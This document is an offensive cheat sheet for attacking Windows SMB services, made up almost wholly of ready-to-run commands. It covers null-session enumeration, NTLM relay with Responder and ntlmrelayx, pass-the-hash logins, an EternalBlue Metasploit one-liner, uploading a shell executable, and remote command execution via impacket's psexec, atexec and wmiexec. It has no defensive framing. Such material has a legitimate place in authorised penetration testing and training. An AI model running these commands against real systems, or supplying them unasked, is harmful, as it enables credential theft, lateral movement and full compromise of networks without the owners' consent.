# SMB Attacks

## 1. Null Session
```bash
smbclient -L //target -N
smbclient //target/share -N
rpcclient -U "" -N target
enum4linux -a target
```

## 2. Share Enumeration
```bash
smbclient -L //target -U user%password
crackmapexec smb target -u user -p password --shares
smbmap -H target -u user -p password
```

## 3. SMB Relay
```bash
# Capture NTLMv2 hash
impacket-ntlmrelayx -t target -smb2support
# Trigger authentication
responder -I eth0 -wF
```

## 4. Pass-the-Hash
```bash
crackmapexec smb target -u administrator -H 'ntlm_hash'
smbclient //target/share -U administrator --pw-nt-hash ntlm_hash
impacket-psexec -hashes :ntlm_hash domain/administrator@target
```

## 5. EternalBlue (MS17-010)
```bash
# Scan
nmap --script smb-vuln-ms17-010 -p 445 target
# Exploit
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; run"
```

## 6. SMB Signing Disabled
```bash
crackmapexec smb target --gen-relay-list targets.txt
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## 7. SMBv1
```bash
# If SMBv1 enabled, vulnerable to various attacks
crackmapexec smb target -u user -p password -M ms17-010
```

## 8. File Read/Write
```bash
# Read
smbclient //target/share -U user%password -c "get secret.txt"
# Write
smbclient //target/share -U user%password -c "put shell.exe"
```

## 9. Scheduled Task via SMB
```bash
crackmapexec smb target -u user -p password -x "whoami"
impacket-atexec domain/user:password@target "whoami"
```

## 10. WMI via SMB
```bash
impacket-wmiexec domain/user:password@target
crackmapexec wmi target -u user -p password -x "whoami"
```

## Tools
```bash
# crackmapexec
# smbclient
# smbmap
# enum4linux-ng
# impacket suite
# responder
```
